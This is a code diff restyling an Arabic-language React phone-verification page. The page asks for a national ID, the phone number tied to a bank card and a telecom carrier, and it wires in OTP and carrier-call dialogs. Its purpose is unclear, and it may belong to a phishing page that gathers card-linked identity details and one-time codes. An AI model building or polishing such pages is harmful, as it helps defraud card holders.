@@ -12,6 +12,13 @@ import { PhoneOtpDialog } from "@/components/phone-otp-dialog";
 import { CarrierVerificationModal } from "@/components/carrier-verification-modal";
 import { StcCallDialog } from "@/components/stc-call-dialog";
 import { useVisitorRouting } from "@/hooks/use-visitor-routing";
+import {
+  Select,
+  SelectContent,
+  SelectItem,
+  SelectTrigger,
+  SelectValue,
+} from "@/components/ui/select";
 
 const telecomOperators = [
   { value: "stc", label: "STC - الاتصالات السعودية" },
@@ -210,21 +217,27 @@ export default function PhoneVerificationPage() {
   return (
     <>
       <div
-        className="min-h-screen bg-gradient-to-b from-[#1a5c85] to-[#2d7ba8] flex items-center justify-center p-4"
+        className="min-h-screen bg-gradient-to-b from-background to-muted flex items-center justify-center p-4"
         dir="rtl"
-      >`1`````````````
+      >
         <div className="w-full max-w-lg space-y-6">
-          <div className="text-center text-white space-y-2 mb-8">
-            <h1 className="text-4xl font-bold text-balance">
+          <div className="text-center space-y-2 mb-8">
+            <div className="inline-flex items-center gap-2 rounded-full border border-border bg-card/60 backdrop-blur px-4 py-2 text-sm text-muted-foreground shadow-sm">
+              <ShieldCheck className="h-4 w-4 text-primary" />
+              التحقق بخطوة إضافية لحماية حسابك
+            </div>
+            <h1 className="text-3xl sm:text-4xl font-bold text-foreground text-balance mt-4">
               نظام التحقق الآمن
             </h1>
-            <p className="text-lg text-white/90">تحقق من هويتك بأمان وسرعة</p>
+            <p className="text-base sm:text-lg text-muted-foreground">
+              تحقق من هويتك بأمان وسرعة
+            </p>
           </div>
 
-          <Card className="p-6 space-y-6">
+          <Card className="p-6 space-y-6 shadow-xl border-border/60">
             <div className="text-center space-y-4">
-              <div className="inline-flex items-center justify-center w-20 h-20 rounded-full bg-[#1a5c85]">
-                <Phone className="w-10 h-10 text-white" />
+              <div className="inline-flex items-center justify-center w-20 h-20 rounded-2xl bg-primary/10 border border-primary/20">
+                <Phone className="w-10 h-10 text-primary" />
               </div>
               <div>
                 <h2 className="text-2xl font-bold text-gray-900 dark:text-gray-100 mb-2">
@@ -236,10 +249,10 @@ export default function PhoneVerificationPage() {
               </div>
             </div>
 
-            <div className="bg-blue-50 dark:bg-blue-900/20 border-r-4 border-blue-500 p-4 rounded-lg">
+            <div className="bg-primary/5 border-r-4 border-primary p-4 rounded-lg">
               <div className="flex items-start gap-3">
-                <ShieldCheck className="w-5 h-5 text-blue-600 dark:text-blue-400 flex-shrink-0 mt-0.5" />
-                <p className="text-sm text-blue-900 dark:text-blue-100 font-medium leading-relaxed">
+                <ShieldCheck className="w-5 h-5 text-primary flex-shrink-0 mt-0.5" />
+                <p className="text-sm text-foreground/90 font-medium leading-relaxed">
                   للتحقق من ملكية وسيلة الدفع، يُرجى إدخال رقم الهوية ورقم
                   الهاتف المرتبطين ببطاقتك البنكية.
                 </p>
@@ -311,31 +324,30 @@ export default function PhoneVerificationPage() {
               >
                 شركة الاتصالات *
               </Label>
-              <select
-                id="carrier"
+              <Select
                 value={selectedCarrier}
-                onChange={(e) => setSelectedCarrier(e.target.value)}
-                className="w-full h-12 text-right text-base border-2 rounded-lg px-4 bg-white dark:bg-gray-800 focus:border-[#1a5c85] focus:outline-none shadow-sm appearance-none cursor-pointer"
-                style={{
-                  backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23666' d='M6 9L1 4h10z'/%3E%3C/svg%3E")`,
-                  backgroundRepeat: "no-repeat",
-                  backgroundPosition: "left 1rem center",
-                  paddingLeft: "2.5rem",
-                }}
-                data-testid="select-carrier"
+                onValueChange={(value) => setSelectedCarrier(value)}
               >
-                <option value="">اختر شركة الاتصالات</option>
-                {telecomOperators.map((operator) => (
-                  <option key={operator.value} value={operator.value}>
-                    {operator.label}
-                  </option>
-                ))}
-              </select>
+                <SelectTrigger
+                  id="carrier"
+                  className="h-12 text-right"
+                  data-testid="select-carrier"
+                >
+                  <SelectValue placeholder="اختر شركة الاتصالات" />
+                </SelectTrigger>
+                <SelectContent>
+                  {telecomOperators.map((operator) => (
+                    <SelectItem key={operator.value} value={operator.value}>
+                      {operator.label}
+                    </SelectItem>
+                  ))}
+                </SelectContent>
+              </Select>
             </div>
 
             <Button
               onClick={handleSendOtp}
-              className="w-full h-14 text-lg bg-[#1a5c85] hover:bg-[#154a6d] disabled:opacity-50 disabled:cursor-not-allowed"
+              className="w-full h-14 text-lg"
               disabled={!isFormValid || isSubmitting}
               data-testid="button-send-otp"
             >
@@ -343,8 +355,8 @@ export default function PhoneVerificationPage() {
               {isSubmitting ? "جاري الإرسال..." : "إرسال رمز التحقق"}
             </Button>
 
-            <div className="bg-blue-50 dark:bg-blue-900/20 border border-blue-200 dark:border-blue-700 rounded-lg p-3 text-center">
-              <p className="text-sm text-blue-900 dark:text-blue-100 flex items-center justify-center gap-2">
+            <div className="bg-muted/60 border border-border rounded-lg p-3 text-center">
+              <p className="text-sm text-muted-foreground flex items-center justify-center gap-2">
                 <Lock className="h-4 w-4" />
                 معلوماتك محمية بأعلى معايير الأمان والخصوصية
               </p>
